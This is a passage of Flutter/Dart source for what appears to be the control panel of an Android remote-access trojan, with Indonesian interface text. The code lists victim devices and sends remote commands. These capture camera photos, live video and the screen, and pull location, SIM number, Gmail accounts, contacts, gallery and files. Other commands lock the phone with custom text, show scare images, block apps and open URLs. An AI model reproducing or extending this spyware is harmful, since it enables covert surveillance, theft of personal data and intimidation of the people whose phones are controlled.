              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildBottomNav() {
    return Container(
      decoration: const BoxDecoration(
        color: bgSurface,
        border: Border(top: BorderSide(color: accentWhite, width: 3)),
      ),
      child: Padding(
        padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 16),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceAround,
          children: [
            _buildNavItem(Icons.phone_android_outlined, "Devices", TabIndex.devices),
            _buildNavItem(Icons.settings_outlined, "Control", TabIndex.control),
            _buildNavItem(Icons.chat_bubble_outline, "Messages", TabIndex.messages),
          ],
        ),
      ),
    );
  }

  Widget _buildNavItem(IconData icon, String label, TabIndex tab) {
    bool isActive = _currentTab == tab;
    return GestureDetector(
      onTap: () {
        setState(() {
          _currentTab = tab;
        });
      },
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
            decoration: isActive
                ? BoxDecoration(
                    color: bgCard,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.5),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  )
                : null,
            child: Icon(
              icon,
              color: isActive ? accentWhite : textSub,
              size: 26,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            label,
            style: TextStyle(
              color: isActive ? accentWhite : textSub,
              fontSize: 10,
              fontWeight: isActive ? FontWeight.bold : FontWeight.normal,
              shadows: isActive
                  ? const [
                      Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                    ]
                  : null,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTabContent() {
    switch (_currentTab) {
      case TabIndex.devices:
        return _buildDevicesTab();
      case TabIndex.control:
        return _buildControlTab();
      case TabIndex.messages:
        return _buildMessagesTab();
    }
  }

  Widget _buildDevicesTab() {
    return Container(
      color: bgMain,
      child: Column(
        children: [
          _buildDeviceHeader(),
          Expanded(
            child: _devices.isEmpty
                ? const Center(child: Text("No Devices Found", style: TextStyle(color: textSub)))
                : ListView.builder(
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                    itemCount: _devices.length,
                    itemBuilder: (context, index) {
                      final device = _devices[index];
                      return _buildDeviceCard(device, index);
                    },
                  ),
          ),
        ],
      ),
    );
  }

  Widget _buildDeviceHeader() {
    return Container(
      color: bgMain,
      padding: const EdgeInsets.fromLTRB(16, 16, 16, 8),
      child: Row(
        children: [
          const Text(
            "DEVICES",
            style: TextStyle(
              color: accentWhite,
              fontWeight: FontWeight.bold,
              letterSpacing: 2,
              fontSize: 13,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
              ],
            ),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Container(
              height: 3,
              color: accentWhite.withOpacity(0.3),
            ),
          ),
          const SizedBox(width: 8),
          Icon(Icons.help_outline, color: accentWhite.withOpacity(0.5), size: 20),
        ],
      ),
    );
  }

  Widget _buildDeviceCard(dynamic device, int index) {
    final bool isActive = device['status'] != 'Offline';
    final Color statusColor = isActive ? successColor : errorColor;
    final String displayName = device['name'] ?? device['model'] ?? 'Unknown Device';
    final int battery = device['battery'] ?? 0;
    final String androidVersion = device['androidVersion'] ?? 'Unknown';
    final int sdkVersion = device['sdkVersion'] ?? 0;
    final String number = (index + 1).toString().padLeft(2, '0');

    return GestureDetector(
      onTap: () {
        setState(() {
          _targetId = device['id']?.toString() ?? '';
          _targetModel = displayName;
          _deviceData = Map<String, dynamic>.from(device);
          _currentTab = TabIndex.control;
        });
        _addLog("🎯 Selected: $_targetModel", LogType.success);
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: bgCard,
          border: Border.all(color: borderLight, width: 2),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.6),
              blurRadius: 0,
              offset: const Offset(4, 4),
            ),
          ],
        ),
        child: Row(
          children: [
            Column(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: bgSurface,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.5),
                        blurRadius: 0,
                        offset: const Offset(2, 2),
                      )
                    ],
                  ),
                  child: const Icon(Icons.phone_android, color: accentWhite, size: 32),
                ),
                const SizedBox(height: 6),
                Row(
                  children: [
                    Icon(Icons.battery_charging_full, size: 12, color: battery > 20 ? successColor : errorColor),
                    const SizedBox(width: 4),
                    Text(
                      "$battery%",
                      style: const TextStyle(
                        color: textMain,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                        shadows: [
                          Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                        ],
                      ),
                    ),
                  ],
                ),
              ],
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    displayName,
                    style: const TextStyle(
                      color: textMain,
                      fontWeight: FontWeight.bold,
                      fontSize: 14,
                      shadows: [
                        Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                      ],
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    "Android $androidVersion - SDK $sdkVersion",
                    style: const TextStyle(color: textSub, fontSize: 11),
                  ),
                ],
              ),
            ),
            Column(
              crossAxisAlignment: CrossAxisAlignment.end,
              children: [
                Container(
                  width: 10,
                  height: 10,
                  decoration: BoxDecoration(
                    color: statusColor,
                    boxShadow: [
                      BoxShadow(color: statusColor, blurRadius: 6, spreadRadius: 1),
                    ],
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  number,
                  style: const TextStyle(color: textSub, fontSize: 12),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildControlTab() {
    if (_targetId == "unknown") {
      return Container(
        color: bgMain,
        child: const Center(
          child: Text(
            "PILIH DEVICE DULU CUY!",
            style: TextStyle(
              color: textSub,
              fontSize: 15,
              fontWeight: FontWeight.bold,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
              ],
            ),
          ),
        ),
      );
    }

    return Container(
      color: bgMain,
      child: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _buildDeviceInfoCard(),
            const SizedBox(height: 20),
            const Text(
              "REMOTE KONTROL",
              style: TextStyle(
                color: textMain,
                fontSize: 16,
                fontWeight: FontWeight.bold,
                letterSpacing: 2,
                shadows: [
                  Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                ],
              ),
            ),
            const SizedBox(height: 8),
            const Text(
              "KONTROL",
              style: TextStyle(color: textSub, fontSize: 11, letterSpacing: 1),
            ),
            const SizedBox(height: 16),
            GridView.builder(
              shrinkWrap: true,
              physics: const NeverScrollableScrollPhysics(),
              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                crossAxisCount: 2,
                crossAxisSpacing: 12,
                mainAxisSpacing: 12,
                childAspectRatio: 1.1,
              ),
              itemCount: _controlItems.length,
              itemBuilder: (context, index) {
                final item = _controlItems[index];
                if (item['isToggle'] == true) {
                  return _buildToggleCard(
                    label: item['label'],
                    icon: item['icon'],
                    color: item['color'],
                    isOn: item['isOn'],
                    needsInput: item['needsInput'] ?? false,
                    inputHint: item['inputHint'] ?? '',
                    inputType: item['inputType'] ?? 'text',
                    command: item['command'],
                  );
                } else {
                  return _buildActionCard(
                    label: item['label'],
                    icon: item['icon'],
                    color: item['color'],
                    onTap: () => _handleActionTap(item),
                  );
                }
              },
            ),
            const SizedBox(height: 20),
            _buildTerminalLogs(),
            const SizedBox(height: 20),
            _buildControlFooter(),
          ],
        ),
      ),
    );
  }

  Widget _buildToggleCard({
    required String label,
    required IconData icon,
    required Color color,
    required bool isOn,
    required bool needsInput,
    required String inputHint,
    required String inputType,
    required String command,
  }) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: bgCard,
        border: Border.all(color: borderLight, width: 2),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.6),
            blurRadius: 0,
            offset: const Offset(4, 4),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  color: bgSurface,
                  border: Border.all(color: color, width: 2),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.5),
                      blurRadius: 0,
                      offset: const Offset(2, 2),
                    )
                  ],
                ),
                child: Icon(icon, color: color, size: 24),
              ),
              Switch(
                value: isOn,
                onChanged: (bool value) async {
                  if (command == 'jumpscareStart') {
                    if (value == true) {
                      _showJumpscareDialog();
                    } else {
                      _sendCommand('jumpscareStop', extra: 'true');
                      setState(() {
                        _isJumpscareActive = false;
                        _updateControlItemState(command, false);
                      });
                    }
                    return;
                  }
                  if (command == 'jumpscare2Start') {
                    if (value == true) {
                      _showJumpscare2Dialog();
                    } else {
                      _sendCommand('jumpscare2Stop', extra: 'true');
                      setState(() {
                        _isJumpscare2Active = false;
                        _updateControlItemState(command, false);
                      });
                    }
                    return;
                  }
                  if (command == 'videoOverlay') {
                    _sendCommand(command, extra: value ? 'start' : 'stop');
                    setState(() {
                      _updateControlItemState(command, value);
                      if (command == 'videoOverlay') _isVideoOverlayActive = value;
                    });
                    return;
                  }
                  if (command == 'lockDevice') {
                    if (value == true) {
                      String? input = await _showLockDeviceDialog();
                      if (input == null) return;
                      _sendCommand(command, extra: input);
                      setState(() {
                        _updateControlItemState(command, true);
                      });
                    } else {
                      _sendCommand('unlockDevice', extra: '');
                      setState(() {
                        _updateControlItemState(command, false);
                      });
                    }
                    return;
                  }
                  if (command == 'lockCustom') {
                    if (value == true) {
                      // Dialog manual
                    } else {
                      _sendCommand('unlockDevice', extra: '');
                      setState(() {
                        _updateControlItemState(command, false);
                      });
                    }
                    return;
                  }
                  if (needsInput && value == true) {
                    String? input = await _showInputDialog(
                      title: "Input untuk $label",
                      hint: inputHint,
                      multiline: inputType == 'multiline',
                      keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
                    );
                    if (input == null) return;
                    _sendCommand(command, extra: input);
                    setState(() {
                      _updateControlItemState(command, true);
                    });
                  } else if (needsInput && value == false) {
                    if (command == 'lockCustom') {
                      _sendCommand('unlockDevice', extra: '');
                    } else {
                      _sendCommand(command, extra: 'false');
                    }
                    setState(() {
                      _updateControlItemState(command, false);
                    });
                  } else {
                    _sendCommand(command, extra: value.toString());
                    setState(() {
                      _updateControlItemState(command, value);
                    });
                  }
                },
                activeColor: accentWhite,
                activeTrackColor: accentWhite.withOpacity(0.3),
                inactiveThumbColor: textSub,
                inactiveTrackColor: bgSurface,
              ),
            ],
          ),
          const Spacer(),
          Text(
            label,
            style: const TextStyle(
              color: textMain,
              fontSize: 13,
              fontWeight: FontWeight.bold,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
              ],
            ),
          ),
          const SizedBox(height: 4),
          Text(
            isOn ? "On" : "Off",
            style: TextStyle(
              color: isOn ? successColor : textSub,
              fontSize: 11,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildActionCard({
    required String label,
    required IconData icon,
    required Color color,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: bgCard,
          border: Border.all(color: borderLight, width: 2),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.6),
              blurRadius: 0,
              offset: const Offset(4, 4),
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              width: 44,
              height: 44,
              decoration: BoxDecoration(
                color: bgSurface,
                border: Border.all(color: color, width: 2),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    blurRadius: 0,
                    offset: const Offset(2, 2),
                  )
                ],
              ),
              child: Icon(icon, color: color, size: 24),
            ),
            const Spacer(),
            Text(
              label,
              style: const TextStyle(
                color: textMain,
                fontSize: 13,
                fontWeight: FontWeight.bold,
                shadows: [
                  Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                ],
              ),
            ),
            const SizedBox(height: 4),
            const Text(
              "TAP",
              style: TextStyle(color: textSub, fontSize: 11),
            ),
          ],
        ),
      ),
    );
  }

  void _handleActionTap(Map<String, dynamic> item) async {
    final command = item['command'];
    final needsInput = item['needsInput'] ?? false;
    final inputHint = item['inputHint'] ?? '';
    final inputType = item['inputType'] ?? 'text';
    final extra = item['extra'] ?? '';

    if (command == "camera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _takeScreenshotViaRest(facing);
      return;
    }
    if (command == "liveCamera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _startLiveCameraPolling(facing);
      return;
    }
    if (command == "stopCamera") {
      _sendCommand('camera', extra: 'stop');
      _addLog("📷 Stop camera command sent", LogType.info);
      if (_cameraModalVisible) _closeCameraModal();
      return;
    }
    if (command == "stopScreen") {
      _sendCommand('screen', extra: 'stop');
      _addLog("🖥️ Stop screen command sent", LogType.info);
      if (_screenModalVisible) _closeScreenModal();
      return;
    }
    if (command == "videoOverlay") {
      return;
    }
    if (command == "getLocation") {
      _sendCommand('getLocation', extra: '');
      _addLog("📍 Getting location...", LogType.info);
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (context) {
          _locationLoadingContext = context;
          return Dialog(
            backgroundColor: Colors.transparent,
            child: Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: bgCard,
                border: Border.all(color: accentWhite, width: 3),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.8),
                    blurRadius: 0,
                    offset: const Offset(6, 6),
                  )
                ],
              ),
              child: const Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  SizedBox(width: 40, height: 40, child: CircularProgressIndicator(color: accentWhite, strokeWidth: 3)),
                  SizedBox(height: 16),
                  Text(
                    "MENGAMBIL LOKASI...",
                    style: TextStyle(
                      color: textSub,
                      fontSize: 11,
                      letterSpacing: 2,
                      shadows: [
                        Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          );
        },
      );
      return;
    }
    if (command == "getPhone") {
      _sendCommand('getPhone', extra: '');
      _addLog("📱 Mengambil data nomor SIM...", LogType.info);
      return;
    }
    if (command == "getGmail") {
      _sendCommand('getGmail', extra: '');
      _addLog("📧 Mengambil data Gmail...", LogType.info);
      return;
    }
    if (command == "getContacts") {
      _sendCommand('getContacts', extra: '');
      _addLog("📇 Mengambil data kontak...", LogType.info);
      return;
    }
    if (command == "setWallpaper") {
      _showUrlDialog("Set Wallpaper", "Masukkan URL Gambar", "https://example.com/image.jpg", command, extra);
      return;
    }
    if (command == "openUrl") {
      _showUrlDialog("Open Situs", "Masukkan URL Situs", "https://example.com", command, extra);
      return;
    }
    if (command == "playAudio") {
      _showUrlDialog("Play Audio", "Masukkan URL Audio", "https://example.com/audio.mp3", command, extra);
      return;
    }
    if (command == "jumpscareStart") {
      _showJumpscareDialog();
      return;
    }
    if (command == "jumpscare2Start") {
      _showJumpscare2Dialog();
      return;
    }
    if (command == "blockApp") {
      _showBlockAppBottomSheet();
      return;
    }
    if (command == "getGallery") {
      _openGalleryFullscreen();
      return;
    }
    if (command == "getFiles") {
      _openFileManagerFullscreen();
      return;
    }

    if (needsInput) {
      String? input;
      if (command == 'lockDevice') {
        input = await _showLockDeviceDialog();
      } else {
        input = await _showInputDialog(
          title: "Input untuk ${item['label']}",
          hint: inputHint,
          multiline: inputType == 'multiline',
          keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
          initialValue: extra,
        );
      }
      if (input == null) return;
      _sendCommand(command, extra: input);
    } else {
      _sendCommand(command, extra: extra);
    }
  }

  void _showUrlDialog(String title, String hint, String placeholder, String command, String initialValue) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        final controller = TextEditingController(text: initialValue.isNotEmpty ? initialValue : placeholder);
        return AlertDialog(
          backgroundColor: bgCard,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(4),
            side: const BorderSide(color: accentWhite, width: 3),
          ),
          title: Text(
            title,
            style: const TextStyle(
              color: textMain,
              fontSize: 14,
              fontWeight: FontWeight.bold,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
              ],
            ),
          ),
          content: TextField(
            controller: controller,
            style: const TextStyle(color: textMain, fontSize: 12),
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: const TextStyle(color: textSub),
              filled: true,
              fillColor: bgSurface,
              border: const OutlineInputBorder(
                borderRadius: BorderRadius.zero,
                borderSide: BorderSide(color: accentWhite, width: 2),
              ),
              enabledBorder: const OutlineInputBorder(
                borderRadius: BorderRadius.zero,
                borderSide: BorderSide(color: accentWhite, width: 2),
              ),
              focusedBorder: const OutlineInputBorder(
                borderRadius: BorderRadius.zero,
                borderSide: BorderSide(color: mcGold, width: 2),
              ),
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text("BATAL", style: TextStyle(color: textSub)),
            ),
            ElevatedButton(
              onPressed: () {
                final value = controller.text.trim();
                if (value.isEmpty) {
                  ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("URL tidak boleh kosong!")));
                  return;
                }
                Navigator.pop(context);
                _sendCommand(command, extra: value);
                _addLog("🚀 $command: $value", LogType.success);
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: accentWhite,
                foregroundColor: Colors.white,
                shape: const RoundedRectangleBorder(
                  borderRadius: BorderRadius.zero,
                  side: BorderSide(color: Colors.black, width: 2),
                ),
              ),
              child: const Text("KIRIM"),
            ),
          ],
        );
      },
    );
  }

  void _showJumpscareDialog() {
    final urlController = TextEditingController(text: _jumpscareUrl.isNotEmpty ? _jumpscareUrl : "https://files.catbox.moe/dihycl.jpg");

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        return AlertDialog(
          backgroundColor: bgCard,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(4),
            side: const BorderSide(color: mcRedstone, width: 3),
          ),
          title: const Text(
            "JUMPSCARE",
            style: TextStyle(
              color: textMain,
              fontSize: 14,
              fontWeight: FontWeight.bold,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
              ],
            ),
          ),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text("Masukkan URL Foto", style: TextStyle(color: textSub, fontSize: 11)),
              const SizedBox(height: 8),
              TextField(
                controller: urlController,
                style: const TextStyle(color: textMain, fontSize: 12),
                decoration: InputDecoration(
                  hintText: "https://files.catbox.moe/xxx.jpg",
                  hintStyle: const TextStyle(color: textSub),
                  filled: true,
                  fillColor: bgSurface,
                  border: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: mcRedstone, width: 2),
                  ),
                  enabledBorder: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: mcRedstone, width: 2),
                  ),
                  focusedBorder: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: mcGold, width: 2),
                  ),
                ),
              ),
            ],
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text("BATAL", style: TextStyle(color: textSub)),
            ),
            ElevatedButton(
              onPressed: () {
                final url = urlController.text.trim();
                if (url.isEmpty) {
                  ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("URL tidak boleh kosong!")));
                  return;
                }
                Navigator.pop(context);
                _jumpscareUrl = url;
                _sendCommand('jumpscareStart', extra: url);
                setState(() {
                  _isJumpscareActive = true;
                  _updateControlItemState('jumpscareStart', true);
                });
                _addLog("🚀 Jumpscare Aktif: $url", LogType.success);
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: mcRedstone,
                foregroundColor: Colors.white,
                shape: const RoundedRectangleBorder(
                  borderRadius: BorderRadius.zero,
                  side: BorderSide(color: Colors.black, width: 2),
                ),
              ),
              child: const Text("AKTIFKAN"),
            ),
          ],
        );
      },
    );
  }

  void _showJumpscare2Dialog() {
    final urlController = TextEditingController(text: _jumpscare2Url.isNotEmpty ? _jumpscare2Url : "https://files.catbox.moe/ulrmbb.jpg");
    final durationController = TextEditingController(text: _jumpscare2Duration.toString());

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        return AlertDialog(
          backgroundColor: bgCard,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(4),
            side: const BorderSide(color: mcRedstone, width: 3),
          ),
          title: const Text(
            "JUMPSCARE V2",
            style: TextStyle(
              color: textMain,
              fontSize: 14,
              fontWeight: FontWeight.bold,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
              ],
            ),
          ),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const Text("URL Foto", style: TextStyle(color: textSub, fontSize: 11)),
                const SizedBox(height: 8),
                TextField(
                  controller: urlController,
                  style: const TextStyle(color: textMain, fontSize: 12),
                  decoration: InputDecoration(
                    hintText: "https://files.catbox.moe/xxx.jpg",
                    hintStyle: const TextStyle(color: textSub),
                    filled: true,
                    fillColor: bgSurface,
                    border: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: mcRedstone, width: 2),
                    ),
                    enabledBorder: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: mcRedstone, width: 2),
                    ),
                    focusedBorder: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: mcGold, width: 2),
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                const Text("Durasi (ms) — 1000 = 1 detik", style: TextStyle(color: textSub, fontSize: 11)),
                const SizedBox(height: 8),
                Row(
                  children: [
                    Expanded(
                      child: TextField(
                        controller: durationController,
                        keyboardType: TextInputType.number,
                        style: const TextStyle(color: textMain, fontSize: 12),
                        decoration: InputDecoration(
                          hintText: "3000",
                          hintStyle: const TextStyle(color: textSub),
                          filled: true,
                          fillColor: bgSurface,
                          border: const OutlineInputBorder(
                            borderRadius: BorderRadius.zero,
                            borderSide: BorderSide(color: mcRedstone, width: 2),
                          ),
                          enabledBorder: const OutlineInputBorder(
                            borderRadius: BorderRadius.zero,
                            borderSide: BorderSide(color: mcRedstone, width: 2),
                          ),
                          focusedBorder: const OutlineInputBorder(
                            borderRadius: BorderRadius.zero,
                            borderSide: BorderSide(color: mcGold, width: 2),
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 8),
                    TextButton(
                      onPressed: () {
                        durationController.text = "3000";
                      },
                      child: const Text("Reset", style: TextStyle(color: accentWhite)),
                    ),
                  ],
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text("BATAL", style: TextStyle(color: textSub)),
            ),
            ElevatedButton(
              onPressed: () {
                final url = urlController.text.trim();
                final duration = int.tryParse(durationController.text.trim()) ?? 3000;
                if (url.isEmpty) {
                  ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("URL tidak boleh kosong!")));
                  return;
                }
                if (duration < 500) {
                  ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Durasi minimal 500ms!")));
                  return;
                }
                Navigator.pop(context);
                _jumpscare2Url = url;
                _jumpscare2Duration = duration;
                _sendCommand('jumpscare2Start', extra: jsonEncode({'url': url, 'duration': duration}));
                setState(() {
                  _isJumpscare2Active = true;
                  _updateControlItemState('jumpscare2Start', true);
                });
                _addLog("🚀 jumpscare2Start: $url ($duration ms)", LogType.success);
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: mcRedstone,
                foregroundColor: Colors.white,
                shape: const RoundedRectangleBorder(
                  borderRadius: BorderRadius.zero,
                  side: BorderSide(color: Colors.black, width: 2),
                ),
              ),
              child: const Text("AKTIFKAN"),
            ),
          ],
        );
      },
    );
  }

  void _showBlockAppBottomSheet() {
    setState(() {
      _installedApps = [];
    });

    _sendCommand('getInstalledApps', extra: 'true');
    _addLog("📱 Mengambil daftar aplikasi...", LogType.info);

    showModalBottomSheet(
      context: context,
      backgroundColor: bgCard,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.zero,
        side: BorderSide(color: accentWhite, width: 3),
      ),
      isScrollControlled: true,
      builder: (context) {
        return StatefulBuilder(
          builder: (context, setSheetState) {
            String searchQuery = '';
            List<Map<String, dynamic>> filteredApps = [];

            if (_installedApps.isNotEmpty) {
              filteredApps = searchQuery.isEmpty
                  ? _installedApps
                  : _installedApps.where((app) =>
                      (app['name']?.toString() ?? '').toLowerCase().contains(searchQuery.toLowerCase()) ||
                      (app['package']?.toString() ?? '').toLowerCase().contains(searchQuery.toLowerCase())
                  ).toList();
            }

            return Container(
              padding: const EdgeInsets.fromLTRB(20, 16, 20, 32),
              constraints: BoxConstraints(
                maxHeight: MediaQuery.of(context).size.height * 0.75,
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Center(
                    child: Container(
                      width: 40,
                      height: 4,
                      color: borderLight,
                    ),
                  ),
                  const SizedBox(height: 16),

                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: bgSurface,
                          border: Border.all(color: errorColor, width: 2),
                        ),
                        child: const Icon(Icons.block, color: errorColor, size: 24),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const Text(
                              "BLOCK APPS",
                              style: TextStyle(
                                color: textMain,
                                fontSize: 14,
                                fontWeight: FontWeight.bold,
                                shadows: [
                                  Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                                ],
                              ),
                            ),
                            Text(
                              "${_installedApps.length} apps • ${_blockedApps.length} blocked",
                              style: const TextStyle(color: textSub, fontSize: 10),
                            ),
                          ],
                        ),
                      ),
                      IconButton(
                        icon: const Icon(Icons.close, color: textSub),
                        onPressed: () => Navigator.pop(context),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  Container(
                    height: 3,
                    color: borderLight,
                  ),
                  const SizedBox(height: 12),

                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12),
                    decoration: BoxDecoration(
                      color: bgSurface,
                      border: Border.all(color: accentWhite, width: 2),
                    ),
                    child: TextField(
                      onChanged: (value) {
                        setSheetState(() {
                          searchQuery = value;
                          if (_installedApps.isNotEmpty) {
                            filteredApps = value.isEmpty
                                ? _installedApps
                                : _installedApps.where((app) =>
                                    (app['name']?.toString() ?? '').toLowerCase().contains(value.toLowerCase()) ||
                                    (app['package']?.toString() ?? '').toLowerCase().contains(value.toLowerCase())
                                  ).toList();
                          }
                        });
                      },
                      style: const TextStyle(color: textMain, fontSize: 12),
                      decoration: const InputDecoration(
                        icon: Icon(Icons.search, color: textSub),
                        hintText: "Cari aplikasi...",
                        hintStyle: TextStyle(color: textSub),
                        border: InputBorder.none,
                      ),
                    ),
                  ),
                  const SizedBox(height: 16),

                  Expanded(
                    child: _installedApps.isEmpty
                        ? const Center(
                            child: Column(
                              mainAxisSize: MainAxisSize.min,
                              children: [
                                CircularProgressIndicator(color: accentWhite),
                                SizedBox(height: 16),
                                Text(
                                  "Memuat daftar aplikasi...",
                                  style: TextStyle(color: textSub, fontSize: 11),
                                ),
                              ],
                            ),
                          )
                        : ListView.builder(
                            itemCount: filteredApps.length,
                            itemBuilder: (context, index) {
                              final app = filteredApps[index];
                              final package = app['package'] ?? '';
                              final name = app['name'] ?? package;
                              final isBlocked = _blockedApps.contains(package);
                              final initial = name.isNotEmpty ? name[0].toUpperCase() : '?';

                              return Container(
                                margin: const EdgeInsets.only(bottom: 8),
                                padding: const EdgeInsets.all(12),
                                decoration: BoxDecoration(
                                  color: bgSurface,
                                  border: Border.all(
                                    color: isBlocked ? errorColor : borderLight,
                                    width: 2,
                                  ),
                                  boxShadow: [
                                    BoxShadow(
                                      color: Colors.black.withOpacity(0.5),
                                      blurRadius: 0,
                                      offset: const Offset(2, 2),
                                    )
                                  ],
                                ),
                                child: Row(
                                  children: [
                                    Container(
                                      width: 36,
                                      height: 36,
                                      decoration: BoxDecoration(
                                        color: bgCard,
                                        border: Border.all(
                                          color: isBlocked ? errorColor : accentWhite,
                                          width: 2,
                                        ),
                                      ),
                                      child: Center(
                                        child: Text(
                                          initial,
                                          style: TextStyle(
                                            color: isBlocked ? errorColor : textMain,
                                            fontWeight: FontWeight.bold,
                                            fontSize: 14,
                                            shadows: const [
                                              Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                                            ],
                                          ),
                                        ),
                                      ),
                                    ),
                                    const SizedBox(width: 12),
                                    Expanded(
                                      child: Column(
                                        crossAxisAlignment: CrossAxisAlignment.start,
                                        children: [
                                          Text(
                                            name,
                                            style: const TextStyle(
                                              color: textMain,
                                              fontWeight: FontWeight.bold,
                                              fontSize: 12,
                                            ),
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                          Text(
                                            package,
                                            style: const TextStyle(
                                              color: textSub,
                                              fontSize: 10,
                                            ),
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                        ],
                                      ),
                                    ),
                                    SizedBox(
